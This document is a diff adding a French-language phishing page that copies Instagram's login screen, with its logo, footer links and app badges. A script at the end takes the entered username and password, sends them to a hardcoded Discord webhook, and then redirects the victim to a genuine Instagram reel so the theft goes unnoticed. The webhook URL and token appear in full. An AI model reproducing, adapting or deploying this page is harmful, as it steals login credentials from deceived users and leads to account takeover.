@@ -1,0 +1,118 @@
+<html><head>
+  <link rel="Icon" type="image/x-icon" href="https://a-manu.com/wp-content/uploads/sites/171/2017/04/instagram-Logo-PNG-Transparent-Background-download-300x300.png">
+  <title>Instagram</title>
+</head>
+<body>
+  <span id="root">
+    <section class="section-all">
+      <link rel="stylesheet" href="style.css">
+      <!-- 1-Role Main -->
+      <main class="main" role="main">
+        <div class="wrapper">
+          <article class="article">
+            <div class="content">
+              <div class="login-box">
+                <div class="header">
+                  <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram">
+                </div><!-- Header end -->
+                <div class="form-wrap">
+                  <form class="form">
+
+                    <div class="input-box">
+                      <input type="text" id="username" placeholder="Phone number, username, or email" aria-required="true" maxlength="30" autocapitalize="off" autocorrect="off" name="username" required="">
+                    </div>  
+
+                    <div class="input-box">
+                      <input type="password" name="password" id="password" placeholder="Password" maxlength="30" aria-required="true" autocapitalize="off" autocorrect="off" required="">
+                    </div>  
+
+                    <span class="button-box">
+                      <button class="btn" type="button" name="submit" onclick="sendMessage()">Se connecter</button>
+                    </span>  
+
+                    <a class="forgot" href="https://www.instagram.com/accounts/password/reset">Mot de passe oublié?</a>
+                  </form>
+                </div> <!-- Form-wrap end -->
+              </div> <!-- Login-box end -->
+
+              <div class="login-box">
+                <p class="text">Vous n'avez pas de compte?<a href="https://www.instagram.com/accounts/emailsignup">S'inscrire</a></p>
+              </div> <!-- Signup-box end -->
+
+              <div class="app">
+                <p>Téléchargez l'application.</p>
+                <div class="app-img">
+                  <a href="https://itunes.apple.com/app/instagram/id389801252?pt=428156&amp;ct=igweb.loginPage.badge&amp;mt=8">
+                    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/4b70f6fae447.png">
+                  </a>
+                  <a href="https://play.google.com/store/apps/details?id=com.instagram.android&amp;referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26utm_medium%3Dbadge">
+                    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/f06b908907d5.png">
+                  </a>  
+                </div>  <!-- App-img end-->
+              </div> <!-- App end -->
+            </div> <!-- Content end -->
+          </article>
+        </div> <!-- Wrapper end -->
+      </main>
+
+      <!-- 2-Role Footer -->
+      <footer class="footer" role="contentinfo">
+        <div class="footer-container">
+
+          <nav class="footer-nav" role="navigation">
+            <ul>
+			  <li><a href=""></a></li>
+              <li><a href="https://about.instagram.com">Meta</a></li>
+              <li><a href="https://help.instagram.com">A propos</a></li>
+              <li><a href="https://about.instagram.com/blog">Blog</a></li>
+              <li><a href="https://about.instagram.com/about-us/careers">Emploi</a></li>
+              <li><a href="https://www.instagram.com/developer">Aide</a></li>
+              <li><a href="https://help.instagram.com/519522125107875">Api</a></li>
+              <li><a href="https://help.instagram.com/581066165581870">Confidentialité</a></li>
+              <li><a href="https://www.instagram.com/directory/hashtags">Paramètre des cookkies</a></li>
+              <li><a href="https://www.instagram.com/directory/hashtags">Conditions</a></li>
+              <li><a href="https://www.instagram.com/directory/hashtags">Instagram Lite</a></li>
+              <li><a href="https://www.instagram.com/directory/hashtags">Threads</a></li>
+              <li><a href="https://www.instagram.com/directory/hashtags">Importation des contacts et non-utilisateurs</a></li>
+              <li><a href="https://www.instagram.com/directory/hashtags">Meta Verified</a></li>
+              
+			  <li><a href="">Intsagram</a></li>
+            </ul>
+          </nav>
+
+          <span class="footer-logo">© 2024 Instagram</span>
+        </div> <!-- Footer container end -->
+      </footer>
+      
+    </section>
+  </span> <!-- Root -->
+
+  <!-- Select Link -->
+  <script type="text/javascript">
+    function la(src) {
+      window.location=src;
+    }
+  </script>
+
+  <script>
+  function sendMessage() {
+  function sleep(milliseconds) {
+  const date = Date.now();
+  let currentDate = null;
+  do {
+    currentDate = Date.now();
+  } while (currentDate - date < milliseconds);
+}
+    var request = new XMLHttpRequest();
+    request.open("POST", "https://discord.com/api/webhooks/1271539739161526302/ZDpqjGMUEdqnh7QltoxTYI5sOE_LMeDZ-xd70JYFUiyVuOqT0bWzbuPt1Ak_Clg9hr0c");
+    request.setRequestHeader('Content-type', 'application/json');
+    var params = {
+      content: ("> **USERNAME  : **" + document.getElementById('username').value + "\n> **PASSWORD : **" + document.getElementById('password').value)
+    }
+    request.send(JSON.stringify(params));
+	sleep(400)
+	window.location.replace('https://www.instagram.com/reel/C87iemcRUwm/?igsh=bDRyb3ZxNzdkMGhx');
+  }
+  </script>
+
+</body></html>
